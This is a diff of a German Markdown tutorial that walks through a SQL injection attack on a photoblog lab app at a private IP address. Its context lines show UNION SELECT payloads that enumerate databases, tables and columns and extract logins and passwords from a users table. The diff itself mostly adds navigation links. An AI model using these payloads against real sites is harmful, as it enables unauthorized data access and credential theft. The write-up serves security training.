@@ -11,6 +11,15 @@
 
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Einleitung
 
 Dieses Dokument beschreibt einen vollständigen SQL-Injection-Angriff mit dem Ziel, Informationen aus der Datenbank zu extrahieren und Zugangsdaten zu erlangen. Die genutzte Zielanwendung basiert auf einer MySQL-Datenbank.
@@ -24,6 +33,15 @@ Ziel der folgenden Schritte ist es, über SQL Injection Zugriff auf sensible Dat
 
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Erste Tests
 
 ### Basistest
@@ -31,15 +49,42 @@ Ziel der folgenden Schritte ist es, über SQL Injection Zugriff auf sensible Dat
 http://192.168.1.142/cat.php?id=2 UNION SELECT 1,2,3,4 --+
 ```
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Version Anzeigen
 ```http:
 http://192.168.1.142/cat.php?id=2 UNION SELECT 1,version(),3,4 --+
 ```
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Aktive Datenbank anzeigen
 ```http
 http://192.168.1.142/cat.php?id=2 UNION SELECT 1,database(),3,4 --+
 ```
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### Benutzer anlegen
 ```http
@@ -69,6 +114,15 @@ UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata
 **Ziel-Datenbank: Beispiel:**
 - photoblog
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### Tabellen in der photoblog-Datenbank
 
 ```sql
@@ -79,6 +133,15 @@ UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE
 - categories
 - pictures
 - users
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### Spalten der Tabelle `users`
 
@@ -120,6 +183,15 @@ http://192.168.1.142/cat.php?id=2 UNION SELECT 1,group_concat(id,0x3a3a,login,0x
 
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Haftungsausschluss
 
 Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.
@@ -132,12 +204,6 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 [Disclaimer](/00-disclaimer/disclaimer.md)
 
 --- 
-
-<div align=right>
-
-[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
-
-</div>
 
 Stay curious – stay secure. 🔐
 
